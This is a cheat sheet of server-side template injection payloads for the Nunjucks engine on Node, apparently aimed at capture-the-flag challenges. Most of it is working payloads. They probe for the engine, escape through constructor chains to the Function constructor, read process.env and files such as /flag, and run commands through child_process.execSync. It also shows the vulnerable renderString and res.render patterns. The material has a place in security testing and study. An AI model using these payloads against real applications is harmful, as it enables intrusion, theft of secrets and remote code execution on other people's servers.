# Nunjucks deep dive — the Node Jinja2

Nunjucks is the closest thing to Jinja2 on Node — same `{{}}`/
`{% %}` syntax, same globals-style helpers (`range`, `cycler`,
`joiner`), but a JS runtime behind it. The escapes reach
`process`/`require`/`global` — not Python objects.

---

## 1. The detection set

```text
{{7*7}}         → 49
{{7*'7'}}        → 7777777 — string-mul works like Python!
{{'a'+'b'}}      → 'ab' — JS concat — looks like python result
{{'a'~'b'}}      → 'ab' — nunjucks-concat
{{range(3)}}     → works — jinja-clone helper
{{dump()}}       → may exist
{{undefined}}    → renders empty — silent-fail
{{x.y.z}}        → empty — silent on undefined-attr
```

The `'a'+'b'` → `ab` looks Python-like — the discriminator is
`{{'a'.toUpperCase()}}` (JS method — works) vs `.upper()` (fails).

## 2. The bound-helper globals — `range`/`cycler`/`joiner`

Same names as Jinja — but different objects:

```jinja2
{{range}}         → the function — has .constructor
{{cycler}}        → Cycler class instance
{{joiner}}        → Joiner instance
{{range.constructor}}                  → Function
{{range.constructor('return this')()}}  → global object!
   — Function-ctor eval → the GLOBAL — the main escape
```

`range.constructor('return this')()` — Function-constructor is
`eval`-equivalent — `return this` gives `global`/`globalThis`.

## 3. The constructor-chain — the canonical escape

```jinja2
{{range.constructor('return this')()}}
   → global object
{{range.constructor('return this.process')()}}
   → process!
{{range.constructor('return process.env')()}}
   → all env — FLAG usually here
{{range.constructor('return process.mainModule.require("fs").readFileSync("/flag","utf8")')()}}
   → file read via mainModule
{{range.constructor('return process.mainModule.require("child_process").execSync("id").toString()')()}}
   → exec
{{range.constructor('return this')().process}}
   — same, split
```

`.constructor` on ANY function → `Function` → calling it with a
string body = compiling a new function → eval-equivalent.

## 4. The `constructor.constructor` pattern — the generic chain

```jinja2
{{x.constructor}}                -- the class
{{x.constructor.constructor}}     -- Function — on a function
{{('x').constructor}}             -- String
{{('x').constructor.constructor}} -- Function!
{{(1).constructor}}               -- Number
{{(1).constructor.constructor}}   -- Function
{{[].constructor}}                -- Array
{{[].constructor.constructor}}    -- Function
{{{}.constructor}}                -- Object
{{{}.constructor.constructor}}    -- Function
```

EVERY object's `.constructor.constructor` chain lands on
`Function` — the universal escape:

```jinja2
{{''.constructor.constructor('return process')()}}
{{''.constructor.constructor('return globalThis')()}}
{{[].constructor.constructor('return process.env')()}}
{{{}.constructor.constructor('return process.mainModule')()}}
```

## 5. The `global`/`globalThis`/`process`/`require` direct names

```jinja2
{{global}}            -- bound? maybe not — try
{{globalThis}}
{{process}}           -- bound? sometimes passed in locals
{{process.env}}
{{process.env.FLAG}}
{{process.mainModule}}
{{process.binding()}}
{{require}}           -- bound? usually NOT — blocked by scope
{{this}}              -- context-dependent
{{this.process}}
{{module}} {{exports}}
```

If `require`/`process`/`global` is bound into locals — direct.
Else the `.constructor` chain.

## 6. The cycler/joiner paths — class-instance escapes

```jinja2
{{cycler}}                        -- Cycler instance
{{cycler.__proto__}}              -- JS proto! not python
{{cycler.constructor}}            -- Cycler class — a function
{{cycler.constructor.constructor}} -- Function → eval
{{joiner.constructor}}
{{joiner.constructor.constructor}}
{{namespace.constructor}}
{{range.__proto__}}
{{range.__proto__.constructor}}
```

`__proto__` — the JS-prototype — also reachable — leads to
constructor again. The python-style `__globals__` does NOT exist —
`__globals__`/`__class__`/`__mro__`/`__subclasses__` all fail on
Node — that's the discriminator for "this is a JS engine not
Python".

## 7. Full RCE chains

```jinja2
{{range.constructor('return process.mainModule.require("child_process").execSync("id")')()}}
{{range.constructor('x=process.mainModule.require("child_process");return x.execSync("id")')()}}
{{''.constructor.constructor('return process.binding("spawn_sync")')()}}
{{''.constructor.constructor('return process.env.FLAG')()}}
{{''.constructor.constructor('return process.mainModule.require("fs").readdirSync("/")')()}}
{{''.constructor.constructor('return process.mainModule.require("os").hostname()')()}}
{{''.constructor.constructor('return process.cwd()')()}}
```

`process.mainModule.require` — the entry-point's require —
bypasses "require not defined" in module-scope render.

## 8. Async/process details

```text
execSync → sync — returns Buffer → .toString() needed sometimes
execSpawn — async — no use in sync-render
process.binding('spawn_sync').spawn(...) — lower-level
process.env — plain object — env leak is cheapest RCE-free path
process.cwd() — app-dir — where to look for flag files
process.argv — how app started — flag in args? rare
process.config — build info
```

## 9. Nunjucks filters/features — the clean paths

```jinja2
{{x|dump}}              -- JSON dump of the object
{{x|dump(2)}}
{{x|string}}            -- toString
{{x|join(',')}}
{{config}}              -- if bound — env-object
{{env}} {{locals}}      -- if bound
{{_context?}}           -- no — nunjucks doesn't have _context
{{ctx}}                 -- context obj if bound
{%set x=process%}
```

`_context` is Twig/Jinja — Nunjucks context-access differs:
try `{{ctx}}`, `{{locals}}`, or just enumerate common names.

## 10. Express-nunjucks — the res.render path

```javascript
nunjucks.renderString(userInput)
nunjucks.renderString('Hi '+name)
res.render(userInput)              // view-NAME — file-inclusion
res.render('page', locals)          // locals bound — {{x}}=locals.x
```

`renderString` = full eval-surface. `res.render(name)` = file-
name injection. The locals dict is what `{{x}}` sees — check for
`{{config}}`, `{{env}}`, `{{secrets}}` in app-bound locals.
